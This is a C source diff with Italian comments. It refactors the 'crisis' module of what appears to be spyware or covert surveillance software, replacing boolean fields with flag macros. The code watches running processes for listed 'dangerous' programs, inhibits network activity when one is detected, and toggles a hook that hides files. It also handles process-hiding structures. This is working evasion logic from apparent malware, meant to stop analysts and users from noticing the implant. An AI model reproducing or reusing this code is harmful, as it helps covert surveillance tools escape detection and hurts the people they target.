@@ -22,12 +22,12 @@ WCHAR process_crisis_network[MAX_DYNAMIC_CRISIS_NETWORK+EMBEDDED_CRISIS_NETWORK]
 // Funzione esportata per vedere se e' in un momento di crisi
 BOOL IsCrisisNetwork()
 {
-	return shared.network_crisis;
+	return FLAG_EQUALS(shared.crisis, NETWORK_CRISIS);
 }
 
 BOOL IsCrisisSystem()
 {
-	return shared.system_crisis;
+	return FLAG_EQUALS(shared.crisis, SYSTEM_CRISIS);
 }
 
 #define CRISIS_SLEEPTIME 100
@@ -37,7 +37,7 @@ DWORD WINAPI MonitorCrisisThread(DWORD dummy)
 	DWORD i;
 	HANDLE proc_snap;
 	PROCESSENTRY32W lppe;
-	pid_hide_struct pid_hide = NULL_PID_HIDE_STRUCT;
+	PID_HIDE pid_hide = NULL_PID_HIDE_STRUCT;
 	BOOL process_network_found, process_system_found;
 
 	LOOP {
@@ -86,15 +86,16 @@ DWORD WINAPI MonitorCrisisThread(DWORD dummy)
 		// Se e' cambiato lo stato del crisis network, riporta un messaggio
 		// XXX Questo thread gira anche durante la sync, ma le probabilita' di una race sui log
 		// sono infinitesimali
-		if (!shared.network_crisis && process_network_found)
+		if (FLAG_NOTEQUALS(shared.crisis, NETWORK_CRISIS) && process_network_found)
 			SendStatusLog(L"[Crisis]: Network activity inhibited");
-		else if (shared.network_crisis && !process_network_found)
+		else if (FLAG_EQUALS(shared.crisis, NETWORK_CRISIS) && !process_network_found)
 			SendStatusLog(L"[Crisis]: Network activity restarted");
 
 		// Se ha trovato un processo pericoloso (perche' lo stava checkando) allora setta lo stato
-		shared.system_crisis  = process_system_found;
-		shared.network_crisis = process_network_found;
-		AM_IPCAgentStartStop(PM_CRISISAGENT, shared.system_crisis); // l'hook per l'hiding dei file e' relatico a system crisis
+		SET_BOOLEAN_FLAG(shared.crisis, SYSTEM_CRISIS, process_system_found);
+		SET_BOOLEAN_FLAG(shared.crisis, NETWORK_CRISIS, process_network_found);
+
+		AM_IPCAgentStartStop(PM_CRISISAGENT, FLAG_EQUALS(shared.crisis, SYSTEM_CRISIS)); // l'hook per l'hiding dei file e' relatico a system crisis
 
 		for (i=0; i<CRISIS_SLEEP_ITER; i++) {
 			Sleep(CRISIS_SLEEPTIME);
@@ -124,8 +125,8 @@ DWORD __stdcall PM_CrisisAgentStartStop(BOOL bStartFlag, BOOL bReset)
 	} else {
 		QUERY_CANCELLATION(hCrisisThread, bPM_crcp);
 		// Se stoppo l'agente azzero gli stati di crisi
-		shared.network_crisis = FALSE;
-		shared.system_crisis = FALSE;
+		SET_BOOLEAN_FLAG(shared.crisis, NETWORK_CRISIS, FALSE);
+		SET_BOOLEAN_FLAG(shared.crisis, SYSTEM_CRISIS, FALSE);
 		AM_IPCAgentStartStop(PM_CRISISAGENT, FALSE);
 	}
 
@@ -177,8 +178,7 @@ DWORD __stdcall PM_CrisisAgentInit(JSONObject elem)
 		wcscpy(process_crisis_system[i+EMBEDDED_CRISIS_SYSTEM], hook_array[i]->AsString().c_str());
 
 	// All'inizio le crisi sono disattivate, sara' il thread ad attivarle
-	shared.network_crisis = FALSE;
-	shared.system_crisis = FALSE;
+	shared.crisis = 0;	// clear
 	AM_IPCAgentStartStop(PM_CRISISAGENT, FALSE);
 
 	return 1;
@@ -187,7 +187,7 @@ DWORD __stdcall PM_CrisisAgentInit(JSONObject elem)
 
 void PM_CrisisAgentRegister()
 {
-	shared.network_crisis = FALSE;
-	shared.system_crisis = FALSE;
+	shared.crisis = 0;	// clear
+
 	AM_MonitorRegister(L"crisis", PM_CRISISAGENT, NULL, (BYTE *)PM_CrisisAgentStartStop, (BYTE *)PM_CrisisAgentInit, NULL);
 }
